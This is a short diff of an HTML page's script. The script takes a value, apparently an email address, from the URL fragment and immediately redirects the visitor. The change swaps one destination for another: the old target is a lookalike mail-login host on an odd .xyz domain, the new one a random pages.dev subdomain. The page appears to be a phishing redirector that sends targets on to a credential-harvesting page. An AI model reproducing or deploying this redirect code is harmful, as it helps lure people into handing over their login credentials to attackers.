@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://login.appsuite.no-spae.xyz/mail/VManager";
+			window.location.href = "https://seffbfft87.pages.dev/";
 		}, 0);
 	</script>
 </html>
